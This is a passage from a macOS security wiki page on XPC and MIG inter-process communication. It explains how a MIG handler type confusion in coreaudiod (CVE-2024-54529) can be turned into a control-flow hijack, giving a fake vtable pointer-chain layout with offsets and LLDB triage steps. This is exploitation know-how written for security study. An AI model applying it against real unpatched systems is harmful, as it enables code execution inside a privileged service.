XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
